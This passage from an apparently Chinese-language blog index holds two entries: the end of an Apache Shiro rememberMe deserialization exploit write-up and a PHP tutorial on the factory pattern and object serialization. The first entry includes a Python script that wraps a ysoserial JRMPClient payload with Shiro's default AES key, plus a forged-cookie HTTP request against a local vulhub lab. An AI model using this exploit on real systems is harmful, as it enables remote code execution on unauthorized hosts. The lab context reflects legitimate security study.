class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;&#x2F;Users&#x2F;apple&#x2F;Documents&#x2F;steady-sec&#x2F;shiro&#x2F;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure><p>构造数据包，伪造cookie，发送Payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;doLogin HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 53</span><br><span class="line">Origin: http:&#x2F;&#x2F;127.0.0.1:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;login;jsessionid&#x3D;65E88136CDB707384CB4A4C27659B658</span><br><span class="line">Cookie: JSESSIONID&#x3D;65E88136CDB707384CB4A4C27659B658;rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;vulhub&amp;rememberme&#x3D;remember-me</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 组件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 组件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--核心编程7</title>
      <link href="2020/01/06/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B7/"/>
      <url>2020/01/06/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B7/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP核心编程7"><a href="#PHP核心编程7" class="headerlink" title="PHP核心编程7"></a>PHP核心编程7</h1><h2 id="工厂设计模式"><a href="#工厂设计模式" class="headerlink" title="工厂设计模式"></a>工厂设计模式</h2><h3 id="什么是工厂设计模式"><a href="#什么是工厂设计模式" class="headerlink" title="什么是工厂设计模式"></a>什么是工厂设计模式</h3><p>根据传递不同的类名参数，返回不同类的对象；</p><p>工厂模式，就是生产各种的不同类的对象；</p><p>工厂模式，改变了在类外使用new关键字创建对象的方式，改成了在工厂类中创建类的对象。</p><p>在类的外部我们无法控制类的行为，但在类内部自己可以控制类的行为。</p><h3 id="工厂设计模式的要求"><a href="#工厂设计模式的要求" class="headerlink" title="工厂设计模式的要求"></a>工厂设计模式的要求</h3><p>一般情况下，定义一个工厂类；</p><p>工厂类中的方法，应该是公共的静态的方法；</p><p>该方法功能：就是根据传递的不同参数，去创建不同的类实例；</p><h3 id="实例：创建不同形状类的对象"><a href="#实例：创建不同形状类的对象" class="headerlink" title="实例：创建不同形状类的对象"></a>实例：创建不同形状类的对象</h3><p>工厂类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义形状工厂类：生产不同形状对象的工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//公共的静态的创建不同类对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params">$className</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//根据传递的不同类名参数，返回不同类对象</span></span><br><span class="line"><span class="keyword">switch</span>($className)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Rectangle&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> Rectangle();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Circle&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> Circle();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Line&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> Line();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用工厂类创建需要的类对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//构建类文件的路径</span></span><br><span class="line">$filename = <span class="string">&quot;./libs/<span class="subst">$className</span>.class.php&quot;</span>;</span><br><span class="line"><span class="comment">//如果类文件存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建矩形对象</span></span><br><span class="line">$rectangle = Factory::getInstance(<span class="string">&quot;Rectangle&quot;</span>);</span><br><span class="line">$rectangle-&gt;draw();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建圆形对象</span></span><br><span class="line">$circle = Factory::getInstance(<span class="string">&quot;Circle&quot;</span>);</span><br><span class="line">$circle-&gt;draw();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建线段对象</span></span><br><span class="line">$line = Factory::getInstance(<span class="string">&quot;Line&quot;</span>);</span><br><span class="line">$line-&gt;draw();</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116105224380.png" alt="image-20201116105224380"></p><h2 id="变量序列化"><a href="#变量序列化" class="headerlink" title="变量序列化"></a>变量序列化</h2><h3 id="什么是变量序列化"><a href="#什么是变量序列化" class="headerlink" title="什么是变量序列化"></a>什么是变量序列化</h3><p>序列化是将变量转换为可保存或传输的字符串的过程；</p><p>反序列化就是在适当的时候把这个字符串再转化成原来的变量使用；</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性；</p><p>序列化有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p><h3 id="序列化函数serialize"><a href="#序列化函数serialize" class="headerlink" title="序列化函数serialize()"></a>序列化函数serialize()</h3><p>描述：产生一个可存储的值的表示；</p><p>语法：<code>string serialize ( mixed $value )</code></p><p>参数：$value可以是任何类型，除了资源外；</p><p>返回：返回序列化之后的字符串，可以存储于任何地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//数组变量序列化</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;itcast&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">//序列化：将变量转成可保存的字符串</span></span><br><span class="line">$str = serialize($arr);</span><br><span class="line"><span class="comment">//将序列化字符串，保存到记事本</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;./1.txt&#x27;</span>,$str);</span><br></pre></td></tr></table></figure><h3 id="反序列化函数unserialize"><a href="#反序列化函数unserialize" class="headerlink" title="反序列化函数unserialize()"></a>反序列化函数unserialize()</h3><p>描述：从已存储的表示中创建 PHP 的值</p><p>语法：<code>***\*mixed unserialize ( string $str )\****</code></p><p>说明：对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</p><p>参数：$str为序列化后的字符串；</p><p>返回：返回的是转换之后的值，可为 integer、float、string、array或 object。 如果传递的字符串不可序列化，则返回 FALSE，并产生一个 E_NOTICE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//反序列化：序列化字符串，还原成原始变量</span></span><br><span class="line"><span class="comment">//读取记事本的数据</span></span><br><span class="line">$str = file_get_contents(<span class="string">&#x27;./1.txt&#x27;</span>);</span><br><span class="line"><span class="comment">//将序列化字符串，还原成变量</span></span><br><span class="line">$arr = unserialize($str);</span><br><span class="line"><span class="comment">//打印变量</span></span><br><span class="line">print_r($arr);</span><br></pre></td></tr></table></figure><h3 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h3><p>对象的序列化过程，与其它变量数据一样；</p><p>对象序列化的内容只能包含成员属性；</p><p>当序列化对象时，serialize()函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的数据库配置信息</span></span><br><span class="line"><span class="keyword">private</span> $db_host; <span class="comment">//主机名</span></span><br><span class="line"><span class="keyword">private</span> $db_user; <span class="comment">//用户名</span></span><br><span class="line"><span class="keyword">private</span> $db_pass; <span class="comment">//密码</span></span><br><span class="line"><span class="keyword">private</span> $db_name; <span class="comment">//数据库名</span></span><br><span class="line"><span class="keyword">private</span> $charset; <span class="comment">//字符集</span></span><br><span class="line"><span class="keyword">private</span> $link; <span class="comment">//连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的构造方法：数据库对象初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="comment">//一个方法只做一件事</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb(); <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset(); <span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的连接MySQL服务器方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;db_host, <span class="keyword">$this</span>-&gt;db_user, <span class="keyword">$this</span>-&gt;db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接MySQL服务器失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的选择数据库的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库<span class="subst">&#123;$this-&gt;db_name&#125;</span>失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的设置字符集</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setCharset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_set_charset(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象序列化时，魔术方法__sleep()会自动调用</span></span><br><span class="line"><span class="comment">//在__sleep()中工作：清理不需要的属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//返回要序列化的对象属性的数组</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;db_host&#x27;</span>,<span class="string">&#x27;db_user&#x27;</span>,<span class="string">&#x27;db_pass&#x27;</span>,<span class="string">&#x27;db_name&#x27;</span>,<span class="string">&#x27;charset&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建数据库类的对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;itcast&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line">$db = <span class="keyword">new</span> Db($arr);</span><br><span class="line"><span class="comment">//将数据库对象序列化</span></span><br><span class="line">$str = serialize($db);</span><br><span class="line"><span class="comment">//将对象序列化字符串保存到记事本</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;./2.txt&#x27;</span>,$str);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="对象反序列化"><a href="#对象反序列化" class="headerlink" title="对象反序列化"></a>对象反序列化</h3><p>对象的反序列化过程，与其它变量数据一样；</p><p>当对象反序列化时，unserialize()函数会检查类中是否存在一个__wakeup()方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 __wakeup() 经常用在反序列化操作中，进行一些初始化操作，例如重新建立数据库连接，或执行其它初始化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的数据库配置信息</span></span><br><span class="line"><span class="keyword">private</span> $db_host; <span class="comment">//主机名</span></span><br><span class="line"><span class="keyword">private</span> $db_user; <span class="comment">//用户名</span></span><br><span class="line"><span class="keyword">private</span> $db_pass; <span class="comment">//密码</span></span><br><span class="line"><span class="keyword">private</span> $db_name; <span class="comment">//数据库名</span></span><br><span class="line"><span class="keyword">private</span> $charset; <span class="comment">//字符集</span></span><br><span class="line"><span class="keyword">private</span> $link; <span class="comment">//连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的构造方法：数据库对象初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="comment">//一个方法只做一件事</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb(); <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset(); <span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的连接MySQL服务器方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;db_host, <span class="keyword">$this</span>-&gt;db_user, <span class="keyword">$this</span>-&gt;db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接MySQL服务器失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的选择数据库的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库<span class="subst">&#123;$this-&gt;db_name&#125;</span>失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的设置字符集</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setCharset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_set_charset(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象序列化时，魔术方法__sleep()会自动调用</span></span><br><span class="line"><span class="comment">//在__sleep()中工作：清理不需要的属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//返回要序列化的对象属性的数组</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;db_host&#x27;</span>,<span class="string">&#x27;db_user&#x27;</span>,<span class="string">&#x27;db_pass&#x27;</span>,<span class="string">&#x27;db_name&#x27;</span>,<span class="string">&#x27;charset&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象反序列化时，魔术方法__wakeup()会自动调用</span></span><br><span class="line"><span class="comment">//__wakeup()作用：对象初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb(); <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset(); <span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取记事本的对象序列化字符串</span></span><br><span class="line">$str = file_get_contents(<span class="string">&#x27;./2.txt&#x27;</span>);</span><br><span class="line"><span class="comment">//对象反序列化</span></span><br><span class="line">$db = unserialize($str);</span><br><span class="line"><span class="comment">//打印$db对象</span></span><br><span class="line">var_dump($db);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
